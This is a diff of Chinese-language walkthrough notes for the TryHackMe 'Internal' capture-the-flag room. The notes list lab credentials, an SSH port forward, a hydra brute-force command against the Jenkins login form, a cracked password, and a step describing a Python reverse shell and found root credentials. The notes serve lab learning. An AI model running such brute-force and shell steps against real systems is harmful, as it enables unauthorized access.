@@ -25,7 +25,7 @@ aubreanna:bubb13guM!@#123
 ssh -L8081:localhost:8080 aubreanna@internal.thm
 7.因為jenkins登入是使用token驗證跳轉,無法辨別返回內容,無法使用hydra
 hydra -l 'admin' -P /home/kali/timmy/TryHackMe/Internal/rockyoufirst5000.txt 127.0.0.1 http-post-form "/j_acegi_security_check:log=j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Location:Invalid"
-8.使用zay暴力破解,根據返回字串長度來確定是否密碼正確
+8.使用zap暴力破解,根據返回字串長度來確定是否密碼正確
 spongebob
 9.登入jenkins使用python取得reverse shell
 10.在opt下找到帳號密碼root:tr0ub13guM!@#123
